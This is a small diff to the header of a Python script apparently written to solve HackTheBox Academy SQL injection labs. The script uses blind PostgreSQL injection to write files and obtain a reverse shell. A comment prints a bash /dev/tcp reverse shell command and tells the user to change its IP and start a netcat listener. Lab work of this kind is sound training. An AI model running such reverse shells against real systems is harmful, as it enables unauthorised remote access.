@@ -3,7 +3,7 @@
 """Created this script to solve the HackTheBox Academy lab called 'Reading and Writing Files' and the lab called 'Command Execution' for the module called 'Advanced SQL Injections'. 
 This script exploits a blind postgreSQL injection to write a file and to get a reverse shell on the target"""
 
-# The base64 string below is base64 of the following reverse shell command: bash -c "bash -i  >& /dev/tcp/127.0.0.1/4444 0>&1".  Open a netcat listener before running the script.
+# The base64 string below is base64 of the following reverse shell command: bash -c "bash -i  >& /dev/tcp/127.0.0.1/4444 0>&1".  Update the IP address in the base64 string, and open a netcat listener before running the script.  
 
 import random
 import string
